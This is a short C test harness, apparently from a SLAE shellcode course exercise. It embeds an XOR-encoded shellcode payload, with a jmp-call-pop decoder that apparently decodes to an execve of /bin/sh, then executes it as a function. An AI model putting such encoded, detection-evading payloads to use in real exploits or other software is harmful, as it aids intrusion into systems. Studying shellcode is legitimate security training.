// execute.c
// Author: Joris Hartog
// Date  : 22-11-2015
// St.nr.: SLAE-704

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x0e\x5e\x31\xc9\xb1\x1a\x8a\x06\x30\x06\x46\xe2\xfb\xeb\x06\xe8\xed\xff\xff\xff\xaa\x9b\x6a\xfa\x23\x48\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a";


void main() {
	printf("Shellcode length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

